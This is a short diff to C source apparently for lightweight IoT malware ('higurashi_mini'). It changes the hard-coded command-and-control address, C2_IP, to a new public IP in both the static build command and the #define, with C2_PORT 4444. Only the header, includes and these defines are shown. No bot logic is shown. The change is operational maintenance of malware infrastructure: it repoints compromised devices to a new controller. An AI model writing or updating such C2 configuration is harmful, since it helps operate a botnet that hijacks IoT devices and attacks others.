@@ -1,5 +1,5 @@
 // higurashi_mini.c - Versión ultraligera para IoT reales (sin SSL/SSH/JSON)
-// Compila estáticamente: musl-gcc -static -O2 -DC2_IP='"93.95.231.134"' -o higurashi_mini higurashi_mini.c -lpthread
+// Compila estáticamente: musl-gcc -static -O2 -DC2_IP='"207.244.255.208"' -o higurashi_mini higurashi_mini.c -lpthread
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -18,7 +18,7 @@
 #include <fcntl.h>
 
 #ifndef C2_IP
-#define C2_IP "93.95.231.134"
+#define C2_IP "207.244.255.208"
 #endif
 #define C2_PORT 4444
 
